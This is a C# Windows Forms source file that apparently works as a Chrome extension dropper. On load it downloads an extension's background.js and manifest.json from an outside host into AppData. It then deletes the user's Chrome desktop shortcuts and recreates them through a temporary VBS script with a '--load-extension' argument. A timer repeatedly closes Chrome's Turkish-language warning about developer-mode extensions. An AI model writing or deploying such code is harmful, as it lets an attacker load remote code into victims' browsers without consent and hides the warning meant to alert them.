using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Addon
{

    public partial class frmChromeMain : Form
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern uint GetShortPathName(string lpszLongPath, char[] lpszShortPath, int cchBuffer);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        const UInt32 WM_CLOSE = 0x0010;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        public frmChromeMain()
        {
            InitializeComponent();
        }



        private void DownloadFile(string url, string place)
        {
            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                using (System.Net.WebClient client = new System.Net.WebClient())
                {
                    client.DownloadFileAsync(new Uri(url), place);
                }
            }
        }
        private string ShortFileName(string long_name)
        {
            char[] name_chars = new char[1024];
            long length = GetShortPathName(
                long_name, name_chars,
                name_chars.Length);

            string short_name = new string(name_chars);
            return short_name.Substring(0, (int)length);
        }

        private static string ProgramFilesx86()
        {
            if (8 == IntPtr.Size
                || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
            {
                return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
            }

            return Environment.GetEnvironmentVariable("ProgramFiles");
        }




        private void frmChromeMain_Load(object sender, EventArgs e)
        {
            // this.Hide();

            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Hedef12");

            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Hedef12"))
            {
                DownloadFile("http://gradidebu.com/eklentitest/background.js", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Hedef12\\background.js");
                DownloadFile("http://gradidebu.com/eklentitest/manifest.json", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Hedef12\\manifest.json");

                if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Hedef12\\background.js") && System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Hedef12\\manifest.json"))
                {

                    if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Google Chrome.lnk"))
                    {
                        System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Google Chrome.lnk");
                    }

                    if (System.IO.File.Exists(Environment.GetEnvironmentVariable("public") + "\\Desktop\\Google Chrome.lnk"))
                    {
                        System.IO.File.Delete(Environment.GetEnvironmentVariable("public") + "\\Desktop\\Google Chrome.lnk");
                    }

                    if (System.IO.File.Exists(ProgramFilesx86() + "\\Google\\Chrome\\Application\\chrome.exe"))
                    {

                        string[] Lines = {"set WshShell = WScript.CreateObject(\"WScript.Shell\")",
                       "strDesktop = WshShell.SpecialFolders(\"Desktop\")",
                       "set oShellLink = WshShell.CreateShortcut(strDesktop & \"\\Google Chrome.lnk\")",
                       "oShellLink.TargetPath = \"" + ProgramFilesx86() + "\\Google\\Chrome\\Application\\chrome.exe\"",
                       "oShellLink.Arguments = \"" + "--load-extension=" + ShortFileName(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Hedef12") + " -- google.com\"",
                       "oShellLink.Save()"};
                        File.WriteAllLines("test.vbs", Lines);
                        Process P = Process.Start("test.vbs");
                        P.WaitForExit(int.MaxValue);
                        File.Delete("test.vbs");


                    }
                }


            }






        }

        public static IntPtr FindWindow(string windowName)
        {
            var hWnd = FindWindow(null, windowName);
            return hWnd;
        }

        private void tmrChromeAddon_Tick(object sender, EventArgs e)
        {

            IntPtr windowPtr = FindWindow("Geliştirici modu uzantılarını devre dışı bırakın");
            SendMessage(windowPtr, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
            this.Text = windowPtr.ToString();




        }

        
    }
}
